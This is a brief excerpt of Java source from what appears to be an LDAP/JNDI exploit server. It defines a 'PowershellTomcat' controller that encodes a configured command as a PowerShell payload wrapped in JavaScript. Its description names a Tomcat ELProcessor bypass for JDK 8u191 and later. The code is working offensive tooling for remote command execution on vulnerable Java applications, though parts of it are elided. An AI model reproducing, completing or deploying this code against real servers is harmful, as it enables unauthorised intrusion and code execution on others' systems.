...
@LdapMapping(uri = "/PowershellTomcat")
@SuppressWarnings("all")
public class PowershellTomcatController implements LdapController {
    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
        String cmd = EncodeUtil.getJavaScriptPayload(
                EncodeUtil.getPowershellPayload(Config.cmd));
        String payload = ("{" +
    ...
    public String getInfo() {
        return "Use Tomcat ELProcessor Bypass JDK 8u191 (Powershell)";
    }
}
